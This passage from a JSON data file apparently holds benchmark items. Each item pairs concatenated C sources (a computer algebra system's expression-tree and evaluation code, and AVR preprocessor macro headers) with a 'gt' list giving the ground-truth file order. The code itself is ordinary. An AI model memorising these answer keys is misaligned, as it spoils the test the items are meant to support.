a_index);\n                had_match = false;\n\n                for(b_index = 0; b_index < length; b_index++) {\n                    pcas_ast_t *b_child;\n\n                    if(!has_used(buffer, top, b_index)) {\n                        b_child = ast_ChildGet(b, b_index);\n\n                        if(ast_Compare(a_child, b_child)) {\n                            had_match = true;\n                            buffer[top++] = b_index;\n                            break;\n                        }\n                    }\n                }\n            }\n\n            free(buffer);\n\n            return had_match;\n        } else {\n            unsigned i;\n\n            for(i = 0; i < length; i++) {\n                if(!ast_Compare(ast_ChildGet(a, i), ast_ChildGet(b, i)))\n                    return false;\n            }\n\n            return true;\n        }\n\n    }\n    }\n\n    return false;\n}\n\nvoid ast_Cleanup(pcas_ast_t *e) {\n    if(e == NULL)\n        return;\n\n    switch(e->type) {\n    case NODE_NUMBER:\n        num_Cleanup(e->op.num);\n        break;\n    case NODE_SYMBOL:\n        break;\n    case NODE_OPERATOR: {\n\n        pcas_ast_t *current = opbase(e);\n        while(current != NULL) {\n            pcas_ast_t *next = current->next;\n            ast_Cleanup(current);\n            current = next;\n        }\n        break;\n    }\n    }\n\n    free(e);\n}\n\npcas_error_t ast_ChildAppend(pcas_ast_t *parent, pcas_ast_t *child) {\n    pcas_ast_t *last;\n\n    if(parent->type != NODE_OPERATOR)\n        return E_AST_NOT_ALLOWED;\n\n    last = ast_ChildGetLast(parent);\n\n    if(last == NULL)\n        opbase(parent) = child;\n    else\n        last->next = child;\n\n    child->next = NULL;\n\n    return E_SUCCESS;\n}\n\npcas_ast_t *ast_ChildGet(pcas_ast_t *parent, LSIZE index) {\n    LSIZE i;\n    pcas_ast_t *current;\n\n    if(parent->type != NODE_OPERATOR)\n        return NULL;\n\n    current = opbase(parent);\n\n    for(i = 0; i <= index && current != NULL; i++) {\n        if(i == index)\n            return current;\n        current = current->next;\n    }\n\n    return 0;\n}\n\npcas_ast_t *ast_ChildGetLast(pcas_ast_t *parent) {\n    if(parent->type != NODE_OPERATOR)\n        return NULL;\n\n    if(opbase(parent) == NULL) {\n        return NULL;\n    } else {\n        pcas_ast_t *current;\n        for(current = opbase(parent); current->next != NULL; current = current->next);\n        return current;\n    }\n\n    return NULL;\n}\n\npcas_error_t ast_ChildInsert(pcas_ast_t *parent, pcas_ast_t *child, LSIZE index) {\n    LSIZE i;\n    pcas_ast_t *current;\n\n    if(parent->type != NODE_OPERATOR)\n        return E_AST_NOT_ALLOWED;\n\n    if(index == 0) {\n        if(opbase(parent) == NULL)\n            opbase(parent) = child;\n        else {\n            child->next = opbase(parent);\n            opbase(parent) = child;\n        }\n\n        return E_SUCCESS;\n    }\n\n    i = 1;\n    current = opbase(parent);\n\n    while(current != NULL) {\n\n        if(i == index) {\n            pcas_ast_t *temp = current->next;\n            current->next = child;\n            child->next = temp;\n\n            return E_SUCCESS;\n        }\n\n        current = current->next;\n        i++;\n    }\n\n    return E_AST_OUT_OF_BOUNDS;\n}\n\npcas_ast_t *ast_ChildRemove(pcas_ast_t *parent, pcas_ast_t *child) {\n    if(parent->type != NODE_OPERATOR)\n        return NULL;\n    return ast_ChildRemoveIndex(parent, ast_ChildIndexOf(parent, child));\n}\n\nLSIZE ast_ChildIndexOf(pcas_ast_t *parent, pcas_ast_t *child) {\n    LSIZE i;\n    pcas_ast_t *current;\n\n    if(parent->type != NODE_OPERATOR)\n        return -1;\n\n    i = 0;\n\n    for(current = opbase(parent); current != NULL; current = current->next) {\n        if(current == child)\n            return i;\n        i++;\n    }\n\n    return -1;\n}\n\npcas_ast_t *ast_ChildRemoveIndex(pcas_ast_t *parent, LSIZE index) {\n    LSIZE i;\n    pcas_ast_t *current;\n\n    if(parent->type != NODE_OPERATOR)\n        return NULL;\n\n    if(index == 0) {\n        pcas_ast_t *temp;\n\n        if(opbase(parent) == NULL)\n            return NULL;\n\n        temp = opbase(parent);\n        opbase(parent) = opbase(parent)->next;\n        temp->next = NULL;\n        return temp;\n    }\n\n    i = 1;\n    current = opbase(parent);\n\n    while(current != NULL) {\n\n        if(i == index) {\n            pcas_ast_t *temp = current->next;\n            current->next = temp == NULL ? NULL : temp->next;\n            if(temp != NULL)\n                temp->next = NULL;\n            return temp;\n        }\n\n        current = current->next;\n        i++;\n    }\n\n    return NULL;\n}\n\nLSIZE ast_ChildLength(pcas_ast_t *parent) {\n    LSIZE i;\n    pcas_ast_t *current;\n\n    if(parent->type != NODE_OPERATOR)\n        return 0;\n\n    i = 0;\n    for(current = opbase(parent); current != NULL; current = current->next)\n        i++;\n\n    return i;\n}",
        "gt": [
            "'PineappleCAS/src/imath/imath.h'",
            "'PineappleCAS/src/imath/imrat.h'",
            "'PineappleCAS/src/ast.h'",
            "'PineappleCAS/src/ast.c'"
        ]
    },
    {
        "files": [
            "'PineappleCAS/src/cas/eval.c'",
            "'PineappleCAS/src/cas/cas.h'",
            "'PineappleCAS/src/cas/derivative.h'"
        ],
        "content": "'PineappleCAS/src/cas/eval.c'\n:#include \"cas.h\"\n\nstatic bool eval_commutative(pcas_ast_t *e, unsigned short flags) {\n\n    unsigned num_changed = false;\n    unsigned i;\n    mp_rat accumulator;\n\n    if(!(flags & EVAL_COMMUTATIVE))\n        return false;\n\n    accumulator = num_FromInt(optype(e) == OP_MULT ? 1 : 0);\n\n    for(i = 0; i < ast_ChildLength(e); i++) {\n        pcas_ast_t *child = ast_ChildGet(e, i);\n\n        if(child->type == NODE_NUMBER) {\n            if(optype(e) == OP_MULT)\n                mp_rat_mul(accumulator, child->op.num, accumulator);\n            else\n                mp_rat_add(accumulator, child->op.num, accumulator);\n\n            ast_Cleanup(ast_ChildRemoveIndex(e, i));\n            i--;\n            num_changed++;\n        } else if(isoptype(e, OP_ADD) && isoptype(child, OP_DIV)) {\n\n            pcas_ast_t *c_num, *c_den;\n\n            c_num = ast_ChildGet(child, 0);\n            c_den = ast_ChildGet(child, 1);\n\n            if(c_num->type == NODE_NUMBER && c_den->type == NODE_NUMBER) {\n                mp_int a, b, c, d;\n                mp_int first, second, num, den;\n\n\n\n                a = &accumulator->num;\n                b = &accumulator->den;\n                c = &c_num->op.num->num;\n                d = &c_den->op.num->num;\n\n                first = mp_int_alloc();\n                mp_int_init(first);\n\n                mp_int_mul(a, d, first);\n\n                second = mp_int_alloc();\n                mp_int_init(second);\n\n                mp_int_mul(b, c, second);\n\n                num = mp_int_alloc();\n                mp_int_add(first, second, num);\n\n                den = mp_int_alloc();\n                mp_int_init(den);\n\n                mp_int_mul(b, d, den);\n\n                mp_int_copy(num, a);\n                mp_int_copy(den, b);\n\n                mp_int_free(first);\n                mp_int_free(second);\n                mp_int_free(num);\n                mp_int_free(den);\n\n                ast_Cleanup(ast_ChildRemoveIndex(e, i));\n\n                i--;\n                num_changed++;\n            }\n        }\n    }\n\n\n    if(ast_ChildLength(e) == 0\n        || (optype(e) == OP_MULT && mp_rat_compare_zero(accumulator) == 0)) {\n        replace_node(e, ast_MakeNumber(accumulator));\n        return true;\n    }\n\n    else if(!((optype(e) == OP_ADD && mp_rat_compare_zero(accumulator) == 0)\n        || (optype(e) == OP_MULT && mp_rat_compare_value(accumulator, 1, 1) == 0))) {\n        ast_ChildInsert(e, ast_MakeNumber(accumulator), 0);\n    }\n    else\n        num_Cleanup(accumulator);\n\n    return num_changed > 1;\n}\n\nstatic bool eval_div(pcas_ast_t *e, unsigned short flags);\n\nstatic bool eval_div_mult(pcas_ast_t *num, pcas_ast_t *den, unsigned short flags) {\n\n    pcas_ast_t *temp_num, *temp_den, *temp_div;\n\n    bool changed = false;\n    bool div_changed = false;\n\n    if(isoptype(num, OP_MULT)) {\n        unsigned i = 0;\n\n        for(i = 0; i < ast_ChildLength(num); i++) {\n\n            temp_num = ast_ChildGet(num, i);\n\n            if(isoptype(den, OP_MULT)) {\n                unsigned j;\n\n                for(j = 0; j < ast_ChildLength(den); j++) {\n                    temp_den = ast_ChildGet(den, j);\n\n                    temp_div = ast_MakeBinary(OP_DIV, ast_Copy(temp_num), ast_Copy(temp_den));\n\n                    div_changed = eval_div(temp_div, flags);\n\n                    if(div_changed) {\n                        ast_Cleanup(ast_ChildRemoveIndex(num, i));\n                        ast_Cleanup(ast_ChildRemoveIndex(den, j));\n\n                        ast_ChildAppend(num, temp_div);\n\n                        changed = true;\n\n                        j--;\n                        break;\n                    } else {\n                        ast_Cleanup(temp_div);\n                    }\n\n                }\n            } else {\n                temp_den = den;\n\n                temp_div = ast_MakeBinary(OP_DIV, ast_Copy(temp_num), ast_Copy(temp_den));\n\n                div_changed = eval_div(temp_div, flags);\n\n                if(div_changed) {\n                    ast_Cleanup(ast_ChildRemoveIndex(num, i));\n                    replace_node(den, ast_MakeNumber(num_FromInt(1)));\n\n                    ast_ChildAppend(num, temp_div);\n\n                    changed = true;\n                } else {\n                    ast_Cleanup(temp_div);\n                }\n\n            }\n        }\n\n    } else if(isoptype(den, OP_MULT)) {\n        unsigned j;\n\n        temp_num = num;\n\n        for(j = 0; j < ast_ChildLength(den); j++) {\n            temp_den = ast_ChildGet(den, j);\n\n            temp_div = ast_MakeBinary(OP_DIV, ast_Copy(temp_num), ast_Copy(temp_den));\n\n            div_changed = eval_div(temp_div, flags);\n\n            if(div_changed) {\n\n                replace_node(num, temp_div);\n                ast_Cleanup(ast_ChildRemoveIndex(den, j));\n\n                changed = true;\n\n                j--;\n                break;\n            } else {\n                ast_Cleanup(temp_div);\n            }\n        }\n\n    }\n\n    return changed;\n}\n\nstatic bool eval_div(pcas_ast_t *e, unsigned short flags) {\n    pcas_ast_t *num, *den;\n\n    bool changed = false;\n\n    num = ast_ChildGet(e, 0);\n    den = ast_ChildGet(e, 1);\n\n    if(flags & EVAL_BASIC_IDENTITIES) {\n\n        if(is_negative_for_sure(num) && is_negative_for_sure(den)) {\n            pcas_ast_t *new_div;\n\n            absolute_val(num);\n            absolute_val(den);\n\n            new_div = ast_MakeBinary(OP_DIV, ast_Copy(num), ast_Copy(den));\n\n            eval_div(new_div, flags);\n            replace_node(e, new_div);\n\n            return true;\n        }\n\n\n        if(ast_Compare(num, den)) {\n            replace_node(e, ast_MakeNumber(num_FromInt(1)));\n            return true;\n        }\n\n        if(num->type == NODE_NUMBER && mp_rat_compare_zero(num->op.num) == 0) {\n            replace_node(e, ast_MakeNumber(num_FromInt(0)));\n            return true;\n        }\n\n        if(den->type == NODE_NUMBER && mp_rat_compare_value(den->op.num, 1, 1) == 0) {\n            replace_node(e, num);\n            return true;\n        }\n    }\n\n    if(!(flags & EVAL_DIVISION))\n        return false;\n\n    if(isoptype(num, OP_POW)) {\n        pcas_ast_t *base1, *power1;\n\n        base1 = ast_ChildGet(num, 0);\n        power1 = ast_ChildGet(num, 1);\n\n        if(isoptype(den, OP_POW)) {\n            pcas_ast_t *base2, *power2;\n\n            base2 = ast_ChildGet(den, 0);\n            power2 = ast_ChildGet(den, 1);\n\n            if(ast_Compare(base1, base2)) {\n\n                replace_node(power1, ast_MakeBinary(OP_ADD,\n                                                    ast_Copy(power1),\n                                                    ast_MakeBinary(OP_MULT,\n                                                                    ast_MakeNumber(num_FromInt(-1)),\n                                                                    ast_Copy(power2))));\n                replace_node(den, ast_MakeNumber(num_FromInt(1)));\n                return true;\n            }\n\n        } else if(ast_Compare(base1, den)) {\n\n            replace_node(power1, ast_MakeBinary(OP_ADD,\n                                                ast_MakeNumber(num_FromInt(-1)),\n                                                ast_Copy(power1)));\n            replace_node(den, ast_MakeNumber(num_FromInt(1)));\n\n            return true;\n        }\n    } else if(isoptype(den, OP_POW) && ast_Compare(num, ast_ChildGet(den, 0))) {\n\n        pcas_ast_t *power2 = ast_ChildGet(den, 1);\n\n        replace_node(power2, ast_MakeBinary(OP_ADD,\n                                                ast_MakeNumber(num_FromInt(-1)),\n                                                ast_Copy(power2)));\n        replace_node(num, ast_MakeNumber(num_FromInt(1)));\n\n        return true;\n    }\n\n    if(eval_div_mult(num, den, flags))\n        return true;\n\n    if(num->type != NODE_NUMBER || den->type != NODE_NUMBER)\n        return false;\n\n\n    if(mp_rat_is_integer(num->op.num) && mp_rat_is_integer(den->op.num)) {\n        mpz_t gcd;\n        mp_int a = &num->op.num->num, b = &den->op.num->num;\n\n\n\n        mp_int_init(&gcd);\n        mp_int_gcd(a, b, &gcd);\n\n        if(mp_int_compare_value(&gcd, 1) != 0) {\n            mp_int_div(a, &gcd, a, NULL);\n            mp_int_div(b, &gcd, b, NULL);\n            changed = true;\n        }\n\n        mp_int_clear(&gcd);\n    }\n\n    return changed;\n}\n\n#define power_in_small_range(a, b) (mp_rat_compare_value((a)->op.num, -1, 1) == 0 || (mp_rat_compare_value((a)->op.num, 10, 1) <= 0 && mp_rat_compare_value((b)->op.num, 10, 1) <= 0))\n\nstatic bool eval_pow(pcas_ast_t *e, unsigned short flags) {\n\n    pcas_ast_t *a, *b;\n    bool changed = false;\n\n    a = ast_ChildGet(e, 0);\n    b = ast_ChildGet(e, 1);\n\n    if (!a || !b) {\n        return false;\n    }\n\n    if(flags & EVAL_BASIC_IDENTITIES) {\n\n        if(is_ast_int(a, 0)) {\n\n            if(!is_ast_int(b, 0)) {\n                replace_node(e, ast_MakeNumber(num_FromInt(0)));\n                return true;\n            }\n        }\n\n\n        else if(is_ast_int(b, 0)) {\n\n            if(!is_ast_int(a, 0)) {\n                replace_node(e, ast_MakeNumber(num_FromInt(1)));\n                return true;\n            }\n        }\n\n\n        else if(is_ast_int(a, 1)) {\n            replace_node(e, a);\n            return true;\n        }\n\n\n        else if(is_ast_int(b, 1)) {\n            replace_node(e, a);\n            return true;\n        }\n\n\n        if(isoptype(a, OP_POW)) {\n            replace_node(e, ast_MakeBinary(OP_POW,\n                                            ast_Copy(ast_ChildGet(a, 0)),\n                                            ast_MakeBinary(OP_MULT,\n                                                ast_Copy(ast_ChildGet(a, 1)),\n                                                ast_Copy(b)\n                                                )\n                                            ));\n            return true;\n        }\n\n\n        if(is_negative_for_sure(b)) {\n            absolute_val(b);\n            replace_node(e, ast_MakeBinary(OP_DIV,\n                                ast_MakeNumber(num_FromInt(1)),\n                                ast_Copy(e)\n                            ));\n            return true;\n        }\n    }\n\n\n    if(a->type == NODE_NUMBER && b->type == NODE_NUMBER) {\n\n        if(mp_rat_is_integer(a->op.num) && mp_rat_is_integer(b->op.num)\n            && mp_rat_compare_zero(b->op.num) > 0) {\n\n            if(flags & EVAL_POWERS_FULL ||\n                (flags & EVAL_POWERS_SMALL && power_in_small_range(a, b))) {\n                mp_rat result;\n\n                result = num_FromInt(1);\n\n                mp_int_expt_full(&a->op.num->num, &b->op.num->num, &result->num);\n\n                replace_node(e, ast_MakeNumber(result));\n\n                return true;\n            }\n\n        }\n\n    }\n\n    else if((flags & EVAL_POWERS_SMALL || flags & EVAL_POWERS_FULL) && a->type == NODE_SYMBOL && a->op.symbol == SYM_IMAG && b->type == NODE_NUMBER) {\n        if(mp_rat_is_integer(b->op.num) && mp_rat_compare_zero(b->op.num) > 0) {\n            mp_small remainder;\n\n            mp_int_mod_value(&b->op.num->num, 4, &remainder);\n\n            if(remainder == 0) {\n                replace_node(e, ast_MakeNumber(num_FromInt(1)));\n            } else if(remainder == 1) {\n                replace_node(e, ast_MakeSymbol(SYM_IMAG));\n            } else if(remainder == 2) {\n                replace_node(e, ast_MakeNumber(num_FromInt(-1)));\n            } else if(remainder == 3) {\n                replace_node(e, ast_MakeBinary(OP_MULT, ast_MakeNumber(num_FromInt(-1)), ast_MakeSymbol(SYM_IMAG)));\n            }\n\n            return true;\n        }\n    }\n\n\n    if((flags & EVAL_POWERS_SMALL || flags & EVAL_POWERS_FULL) && a->type == NODE_NUMBER && b->type == NODE_OPERATOR && optype(b) == OP_DIV && is_ast_int(ast_ChildGet(b, 0), 1) && ast_ChildGet(b, 1)->type == NODE_NUMBER) {\n\n        pcas_ast_t *temp = b;\n        b = a;\n        a = ast_ChildGet(temp, 1);\n\n        if(mp_rat_is_integer(a->op.num) && mp_rat_is_integer(b->op.num) && mp_rat_compare_zero(b->op.num) > 0) {\n            mp_int answer, check;\n            mp_small small;\n\n            answer = mp_int_alloc();\n            mp_int_init(answer);\n\n            mp_int_to_int(&a->op.num->num, &small);\n\n            mp_int_root(&b->op.num->num, small, answer);\n\n\n            check = mp_int_alloc();\n            mp_int_init(check);\n\n            mp_int_expt(answer, small, check);\n\n            if(mp_int_compare(check, &b->op.num->num) == 0) {\n\n                mp_rat ret = num_FromInt(1);\n                mp_int_copy(answer, &ret->num);\n\n                replace_node(e, ast_MakeNumber(ret));\n\n                changed = true;\n            }\n\n            mp_int_free(check);\n            mp_int_free(answer);\n\n        }\n    }\n\n    return changed;\n}\n\nstatic bool eval_int(pcas_ast_t *e, unsigned short flags) {\n    bool changed = false;\n    mp_rat res;\n    pcas_ast_t *a;\n    mp_int remainder;\n\n    if(!(flags & EVAL_INT))\n        return false;\n\n    a = ast_ChildGet(e, 0);\n\n    remainder = mp_int_alloc();\n    mp_int_init(remainder);\n\n    if(a->type == NODE_NUMBER) {\n\n        res = num_FromInt(1);\n\n        mp_int_div(&a->op.num->num, &a->op.num->den, &res->num, remainder);\n\n        if(mp_int_compare_zero(remainder) != 0 && mp_int_compare_zero(&res->num) < 0)\n            mp_int_sub_value(&res->num, 1, &res->num);\n\n        replace_node(e, ast_MakeNumber(res));\n\n        changed = true;\n    } else if(isoptype(a, OP_DIV)) {\n        pcas_ast_t *num, *den;\n\n        num = ast_ChildGet(a, 0);\n        den = ast_ChildGet(a, 1);\n\n        if(num->type == NODE_NUMBER && den->type == NODE_NUMBER) {\n            res = num_FromInt(1);\n\n\n            mp_int_div(&num->op.num->num, &den->op.num->num, &res->num, remainder);\n\n            if(mp_int_compare_zero(remainder) != 0 && mp_int_compare_zero(&res->num) < 0)\n                mp_int_sub_value(&res->num, 1, &res->num);\n\n            replace_node(e, ast_MakeNumber(res));\n\n            changed = true;\n        }\n    }\n\n    mp_int_free(remainder);\n\n    return changed;\n}\n\nstatic bool eval_abs(pcas_ast_t *e, unsigned short flags) {\n    bool changed = false;\n    pcas_ast_t *a = ast_ChildGet(e, 0);\n\n    if(!(flags & EVAL_ABS))\n        return false;\n\n    changed = absolute_val(a) || a->type == NODE_NUMBER;\n\n    if(changed)\n        replace_node(e, a);\n\n    return changed;\n}\n\nstatic bool eval_log(pcas_ast_t *e, unsigned short flags) {\n    pcas_ast_t *base, *val;\n\n    base = ast_ChildGet(e, 0);\n    val = ast_ChildGet(e, 1);\n\n    if(flags & EVAL_BASIC_IDENTITIES) {\n\n        if(is_ast_int(val, 1)) {\n            replace_node(e, ast_MakeNumber(num_FromInt(0)));\n            return true;\n        }\n\n\n\n\n        if(isoptype(val, OP_POW)) {\n            pcas_ast_t *power_base, *power_exponent;\n\n            power_base = ast_ChildGet(val, 0);\n            power_exponent = ast_ChildGet(val, 1);\n\n            replace_node(e, ast_MakeBinary(OP_MULT,\n                                ast_Copy(power_exponent),\n                                ast_MakeBinary(OP_LOG,\n                                    ast_Copy(base),\n                                    ast_Copy(power_base)\n                                )\n                            ));\n            return true;\n\n        }\n    }\n\n\n\n    return false;\n}\n\n#define factorial_in_small_range(a) (mp_rat_compare_value((a)->op.num, 10, 1) <= 0)\n\nstatic bool eval_factorial(pcas_ast_t *e, unsigned short flags) {\n\n    pcas_ast_t *a = ast_ChildGet(e, 0);\n\n    if(a->type == NODE_NUMBER) {\n\n        if(flags & EVAL_BASIC_IDENTITIES) {\n\n            if(mp_rat_compare_zero(a->op.num) == 0) {\n                replace_node(e, ast_MakeNumber(num_FromInt(1)));\n                return true;\n            }\n        }\n\n        if(mp_rat_is_integer(a->op.num) && mp_rat_compare_zero(a->op.num) > 0) {\n            mp_rat accumulator;\n            mp_int i;\n\n            if(flags & EVAL_FACTORIAL_FULL\n            || (flags & EVAL_FACTORIAL_SMALL && factorial_in_small_range(a))) {\n                accumulator = num_FromInt(1);\n                i = mp_int_alloc();\n                mp_int_init_copy(i, &a->op.num->num);\n\n                while(mp_int_compare_zero(i) != 0) {\n                    mp_rat_mul_int(accumulator, i, accumulator);\n                    mp_int_sub_value(i, 1, i);\n                }\n\n                replace_node(e, ast_MakeNumber(accumulator));\n\n                mp_int_free(i);\n\n                return true;\n            }\n\n        }\n\n    }\n\n    return false;\n}\n\n\nbool eval(pcas_ast_t *e, unsigned short flags) {\n\n    bool changed = false;\n    pcas_ast_t *current;\n\n\n    if(isoptype(e, OP_LOG))\n        changed |= eval_log(e, flags);\n\n    if(e->type != NODE_OPERATOR)\n        return false;\n\n    for(current = e->op.operator.base; current != NULL; current = current->next) {\n        changed |= eval(current, flags);\n    }\n\n    if(is_op_commutative(optype(e))) {\n        changed |= eval_commutative(e, flags);\n    } else {\n\n\n        switch(optype(e)) {\n            case OP_DIV: changed |= eval_div(e, flags); break;\n            case OP_POW: changed |= eval_pow(e, flags); break;\n            case OP_INT: changed |= eval_int(e, flags); break;\n            case OP_ABS: changed |= eval_abs(e, flags); break;\n            case OP_FACTORIAL: changed |= eval_factorial(e, flags); break;\n            default:\n                break;\n        }\n    }\n\n    return changed;\n}\n\nbool substitute(pcas_ast_t *e, pcas_ast_t *from, pcas_ast_t *to) {\n\n    if(ast_Compare(e, from)) {\n        replace_node(e, ast_Copy(to));\n        return true;\n    }\n\n    if(e->type == NODE_OPERATOR) {\n        pcas_ast_t *child;\n        bool changed = false;\n\n        for(child = ast_ChildGet(e, 0); child != NULL; child = child->next)\n            changed |= substitute(child, from, to);\n\n        return changed;\n    }\n\n    return false;\n}\n'PineappleCAS/src/cas/cas.h'\n:#ifndef CAS_H_\n#define CAS_H_\n\n#include \"../ast.h\"\n#include \"derivative.h\"\n\n\n#define SIMP_NORMALIZE                  (1u << 0u)\n\n#define SIMP_COMMUTATIVE                (1u << 1u)\n\n#define SIMP_RATIONAL                   (1u << 2u)\n\n#define SIMP_EVAL                       (1u << 3u)\n\n#define SIMP_LIKE_TERMS                 (1u << 4u)\n\n#define SIMP_DERIV                      (1u << 5u)\n\n#define SIMP_ID_GENERAL                 (1u << 6u)\n\n#define SIMP_ID_TRIG                    (1u << 7u)\n\n#define SIMP_ID_TRIG_CONSTANTS          (1u << 8u)\n\n#define SIMP_ID_TRIG_INV_CONSTANTS      (1u << 9u)\n\n#define SIMP_ID_HYPERBOLIC              (1u << 10u)\n\n#define SIMP_ID_COMPLEX                 (1u << 11u)\n\n#define SIMP_ID_ALL                     (SIMP_ID_GENERAL | SIMP_ID_TRIG | SIMP_ID_TRIG_CONSTANTS | SIMP_ID_TRIG_INV_CONSTANTS | SIMP_ID_HYPERBOLIC | SIMP_ID_COMPLEX)\n\n#define SIMP_ALL                        (0xFFFFu)\n\n\nbool simplify(pcas_ast_t *e, unsigned short flags);\n\n\n\n#define CANONICAL_SORT                  (1u << 0u)\n\n#define CANONICAL_RATIONALIZE           (1u << 1u)\n\n#define CANONICAL_POWERS_TO_ROOTS       (1u << 2u)\n\n#define CANONICAL_COMBINE_POWERS        (1u << 3u)\n#define CANONICAL_ALL                   (0xFFu)\n\nbool simplify_canonical_form(pcas_ast_t *e, unsigned char flags);\n\n\n#define FAC_SIMPLE_ADDITION_EVALUATEABLE    (1u << 0u)\n\n#define FAC_SIMPLE_ADDITION_NONEVALUATEABLE (1u << 1u)\n\n#define FAC_POLYNOMIAL                      (1u << 2u)\n#define FAC_ALL                             0xFF\n\nbool factor(pcas_ast_t *e, unsigned char flags);\n\n\n\n\n#define EXP_DISTRIB_NUMBERS        (1u << 0u)\n\n#define EXP_DISTRIB_MULTIPLICATION (1u << 1u)\n\n#define EXP_DISTRIB_DIVISION       (1u << 2u)\n\n#define EXP_DISTRIB_ADDITION       (1u << 3u)\n\n#define EXP_DISTRIB_POWERS         (1u << 4u)\n\n#define EXP_EXPAND_POWERS          (1u << 5u)\n#define EXP_ALL                    0xFF\n\nbool expand(pcas_ast_t *e, unsigned char flags);\n\n\n#define EVAL_BASIC_IDENTITIES   (1u << 0u)\n\n#define EVAL_COMMUTATIVE        (1u << 1u)\n\n#define EVAL_DIVISION           (1u << 2u)\n\n#define EVAL_POWERS_SMALL       (1u << 3u)\n#define EVAL_POWERS_FULL        (1u << 4u)\n\n#define EVAL_INT                (1u << 5u)\n\n#define EVAL_ABS                (1u << 6u)\n\n#define EVAL_FACTORIAL_SMALL    (1u << 7u)\n#define EVAL_FACTORIAL_FULL     (1u << 8u)\n\n#define EVAL_EASY               (EVAL_BASIC_IDENTITIES | EVAL_COMMUTATIVE | EVAL_DIVISION | EVAL_INT | EVAL_ABS | EVAL_POWERS_SMALL | EVAL_FACTORIAL_SMALL)\n\n#define EVAL_HARD               (EVAL_POWERS_FULL | EVAL_FACTORIAL_FULL)\n#define EVAL_ALL                0xFFFF\n\n\nbool eval(pcas_ast_t *e, unsigned short flags);\n\n\nbool substitute(pcas_ast_t *e, pcas_ast_t *from, pcas_ast_t *to);\n\n\npcas_ast_t *gcd(pcas_ast_t *a, pcas_ast_t *b);\n\n\n\n\nvoid replace_node(pcas_ast_t *a, pcas_ast_t *b);\n\n\nbool has_imaginary_node(pcas_ast_t *e);\n\n\nbool is_negative_for_sure(pcas_ast_t *a);\n\n\nbool absolute_val(pcas_ast_t *e);\n\n#endif\n'PineappleCAS/src/cas/derivative.h'\n:#ifndef DERIVATIVE_H_\n#define DERIVATIVE_H_\n\n#include \"identities.h\"\n\n#define ID_NUM_DERIV 18\nextern pcas_id_t id_derivative[ID_NUM_DERIV];\n\nextern pcas_id_t id_deriv_power_rule;\nextern pcas_id_t id_deriv_constant_rule;\nextern pcas_id_t id_deriv_product_rule;\n\n\nbool eval_derivative_nodes(pcas_ast_t *e);\n\nvoid derivative(pcas_ast_t *e, pcas_ast_t *respect_to, pcas_ast_t *eval_at);\n\n#endif",
        "gt": [
            "'PineappleCAS/src/cas/derivative.h'",
            "'PineappleCAS/src/cas/cas.h'",
            "'PineappleCAS/src/cas/eval.c'"
        ]
    },
    {
        "files": [
            "'EasyAVR/firmware/src/ASF/mega/utils/preprocessor/preprocessor.h'",
            "'EasyAVR/firmware/src/ASF/mega/utils/preprocessor/tpaste.h'",
            "'EasyAVR/firmware/src/ASF/mega/utils/preprocessor/mrepeat.h'"
        ],
        "content": "'EasyAVR/firmware/src/ASF/mega/utils/preprocessor/preprocessor.h'\n:\n\n#ifndef _PREPROCESSOR_H_\n#define _PREPROCESSOR_H_\n\n#include \"tpaste.h\"\n#include \"stringz.h\"\n#include \"mrepeat.h\"\n\n\n#endif\n\n'EasyAVR/firmware/src/ASF/mega/utils/preprocessor/tpaste.h'\n:\n\n#ifndef _TPASTE_H_\n#define _TPASTE_H_\n\n\n\n\n\n#define TPASTE2( a, b)                            a##b\n#define TPASTE3( a, b, c)                         a##b##c\n#define TPASTE4( a, b, c, d)                      a##b##c##d\n#define TPASTE5( a, b, c, d, e)                   a##b##c##d##e\n#define TPASTE6( a, b, c, d, e, f)                a##b##c##d##e##f\n#define TPASTE7( a, b, c, d, e, f, g)             a##b##c##d##e##f##g\n#define TPASTE8( a, b, c, d, e, f, g, h)          a##b##c##d##e##f##g##h\n#define TPASTE9( a, b, c, d, e, f, g, h, i)       a##b##c##d##e##f##g##h##i\n#define TPASTE10(a, b, c, d, e, f, g, h, i, j)    a##b##c##d##e##f##g##h##i##j\n\n\n\n\n#define ATPASTE2( a, b)                           TPASTE2( a, b)\n#define ATPASTE3( a, b, c)                        TPASTE3( a, b, c)\n#define ATPASTE4( a, b, c, d)                     TPASTE4( a, b, c, d)\n#define ATPASTE5( a, b, c, d, e)                  TPASTE5( a, b, c, d, e)\n#define ATPASTE6( a, b, c, d, e, f)               TPASTE6( a, b, c, d, e, f)\n#define ATPASTE7( a, b, c, d, e, f, g)            TPASTE7( a, b, c, d, e, f, g)\n#define ATPASTE8( a, b, c, d, e, f, g, h)         TPASTE8( a, b, c, d, e, f, g, h)\n#define ATPASTE9( a, b, c, d, e, f, g, h, i)      TPASTE9( a, b, c, d, e, f, g, h, i)\n#define ATPASTE10(a, b, c, d, e, f, g, h, i, j)   TPASTE10(a, b, c, d, e, f, g, h, i, j)\n\n\n\n\n#endif\n\n'EasyAVR/firmware/src/ASF/mega/utils/preprocessor/mrepeat.h'\n:\n\n#ifndef _MREPEAT_H_\n#define _MREPEAT_H_\n\n\n\n#include \"preprocessor.h\"\n\n\n\n#define MREPEAT_LIMIT   256\n\n\n#define MREPEAT(count, macro, data)         TPASTE2(MREPEAT, count)(macro, data)\n\n#define MREPEAT0(  macro, data)\n#define MREPEAT1(  macro, data)       MREPEAT0(  macro, data)   macro(  0, data)\n#define MREPEAT2(  macro, data)       MREPEAT1(  macro, data)   macro(  1, data)\n#define MREPEAT3(  macro, data)       MREPEAT2(  macro, data)   macro(  2, data)\n#define MREPEAT4(  macro, data)       MREPEAT3(  macro, data)   macro(  3, data)\n#define MREPEAT5(  macro, data)       MREPEAT4(  macro, data)   macro(  4, data)\n#define MREPEAT6(  macro, data)       MREPEAT5(  macro, data)   macro(  5, data)\n#define MREPEAT7(  macro, data)       MREPEAT6(  macro, data)   macro(  6, data)\n#define MREPEAT8(  macro, data)       MREPEAT7(  macro, data)   macro(  7, data)\n#define MREPEAT9(  macro, data)       MREPEAT8(  macro, data)   macro(  8, data)\n#define MREPEAT10( macro, data)       MREPEAT9(  macro, data)   macro(  9, data)\n#define MREPEAT11( macro, data)       MREPEAT10( macro, data)   macro( 10, data)\n#define MREPEAT12( macro, data)       MREPEAT11( macro, data)   macro( 11, data)\n#define MREPEAT13( macro, data)       MREPEAT12( macro, data)   macro( 12, data)\n#define MREPEAT14( macro, data)       MREPEAT13( macro, data)   macro( 13, data)\n#define MREPEAT15( macro, data)       MREPEAT14( macro, data)   macro( 14, data)\n#define MREPEAT16( macro, data)       MREPEAT15( macro, data)   macro( 15, data)\n#define MREPEAT17( macro, data)       MREPEAT16( macro, data)   